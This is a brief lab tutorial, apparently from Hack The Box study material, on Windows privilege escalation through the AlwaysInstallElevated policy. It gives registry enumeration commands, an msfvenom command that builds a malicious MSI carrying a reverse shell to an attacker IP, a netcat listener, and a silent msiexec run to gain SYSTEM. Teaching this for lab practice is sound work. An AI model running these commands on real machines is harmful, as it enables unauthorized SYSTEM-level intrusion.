
[Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) policy is used to install a Windows Installer package with elevated (system) privileges. Exploit w Microsoft Software Installer (MSi) package.

This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.

- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`

```PowerShell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
### Enumerating Always Install Elevated
```

We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

```sh
> msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.111 lport=9443 -f msi > aie.msi
> nc -lvnp 9443
```

We just need to upload this file to the attack machine and execute as follows:

``` PowerShell
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
### Executing the msi file to gain a shell
```

---